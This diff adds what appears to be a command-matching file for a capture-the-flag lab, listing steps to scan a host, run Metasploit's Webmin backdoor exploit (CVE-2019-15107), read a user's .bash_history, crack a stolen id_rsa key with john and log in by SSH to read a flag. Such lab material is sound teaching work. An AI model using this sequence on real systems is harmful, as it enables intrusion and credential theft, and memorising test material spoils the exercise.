@@ -1,0 +1,18 @@
+nmap,db_nmap|172.18.1.5
+cat,searchsploit,nmap|/etc/services,services,webmin,-sV
+msfconsole|
+search|webmin,cve 2019-15107
+use|/exploit/unix/webapp/webmin_backdoor,exploit/unix/webapp/webmin_backdor,unix/webapp/webmin_backdoor,webapp/webmin_backdoor,webmin_backdoor
+show|options
+set|RHOSTS,THREADS,PORTS,LHOST,PAYLOAD,RPORT
+check|exploit_used,rhost_set,rport_set,lhost_set
+run,exploit|
+cat,less,more,head,tail|WARNING-READ-ME.txt
+ls,find,locate|/home/eve,-name,.bash_history
+cat,less,more,head,tail|.bash_history
+cat,less,more,head,tail|id_rsa
+python|ssh2john.py
+john|--wordlist
+chmod|600
+ssh|-i,eve@
+cat,less,more,head,tail|flag.txt
